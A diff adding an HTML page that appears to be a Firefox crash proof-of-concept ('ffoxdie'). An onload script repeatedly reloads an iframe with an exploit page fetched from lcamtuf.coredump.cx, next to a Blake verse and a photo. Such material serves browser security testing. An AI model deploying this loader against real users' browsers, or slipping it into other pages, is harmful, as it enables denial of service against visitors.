@@ -1,0 +1,42 @@
+&lt;html&gt;
+&lt;body bgcolor=black text=white onload=&quot;javascript:foo()&quot;&gt;
+&lt;script&gt;
+&lt;!-- 
+counter = 0;
+
+function foo() {
+  if (counter &lt; 20) {
+    document.getElementById(&#039;foo&#039;).src = &quot;http://lcamtuf.coredump.cx/ffoxdie3_i.html?&quot; +Math.random();
+    setTimeout(&#039;foo()&#039;,10 * counter);
+    counter++;
+  } else {
+    document.getElementById(&#039;foo&#039;).src = &quot;http://lcamtuf.coredump.cx/ffoxdie_ok.html&quot;;
+  }  
+}
+// --&gt;
+&lt;/script&gt;
+&lt;img src=&quot;http://lcamtuf.coredump.cx/photo/current/ula4-6.jpg&quot; style=&quot;border-style: solid; border-width: 1px; border-color: #804040&quot; align=right&gt;
+&lt;font face=&quot;tahoma, helvetica, arial&quot;&gt;
+&lt;font color=lightblue&gt;
+Tyger, Tyger. burning bright&lt;br&gt;
+In the forests of the night,&lt;br&gt;
+What immortal hand or eye&lt;br&gt;
+Could frame thy fearful symmetry?
+&lt;/font&gt;
+&lt;p&gt;
+&lt;b&gt;Please wait approx. 20 seconds...&lt;/b&gt;
+&lt;br&gt;
+&lt;iframe id=foo&gt;
+&lt;/iframe&gt;
+&lt;p&gt;
+&lt;font color=gray&gt;
+Javascript is required.&lt;br&gt;
+Firefox is required.&lt;br&gt;
+May fail on a spotty link.&lt;br&gt;
+Common sense is advised.&lt;br&gt;
+&lt;p&gt;
+More photos: &lt;a href=/photo/current/&gt;click here&lt;/a&gt;
+&lt;/font&gt;
+&lt;/font&gt;
+&lt;/body&gt;
+&lt;/html&gt;
